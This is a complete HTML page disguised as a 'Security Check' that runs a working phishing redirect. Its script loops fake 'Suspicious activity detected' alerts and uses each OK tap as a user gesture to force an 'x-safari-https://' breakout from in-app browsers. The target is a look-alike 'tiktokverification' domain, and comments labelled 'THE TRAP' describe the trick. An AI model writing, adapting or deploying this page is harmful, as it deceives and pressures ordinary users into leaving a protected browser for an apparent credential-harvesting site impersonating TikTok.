<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Check</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        #msg { color: #8A8B91; font-size: 14px; text-align: center; }
    </style>
</head>
<body>

    <div id="msg">Verifying connection integrity...</div>

    <script>
        const target = "tiktokverification.github.io/captcha/Verification/verify1.html";

        function breakout() {
            // Method #1 - The confirmed winner
            window.location.href = "x-safari-https://" + target;
        }

        window.onload = function() {
            const duration = 10000;
            const startTime = Date.now();

            function loop() {
                const elapsed = Date.now() - startTime;
                const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));

                if (remaining > 0) {
                    // THE TRAP:
                    // 1. Show the alert. This pauses all JS execution.
                    alert("Suspicious activity detected.\n\nPlease wait for the security scan to complete.\n\nTime remaining: " + remaining + "s");
                    
                    // 2. The MOMENT they hit 'OK', this line fires. 
                    // Because 'OK' was a user tap, the OS permits the breakout.
                    breakout();

                    // 3. Queue the next one
                    setTimeout(loop, 10);
                } else {
                    alert("Security check complete. Opening Safari...");
                    breakout();
                }
            }

            // Small delay to ensure the page is fully ready to receive the gesture
            setTimeout(loop, 800);
        };
    </script>
</body>
</html>
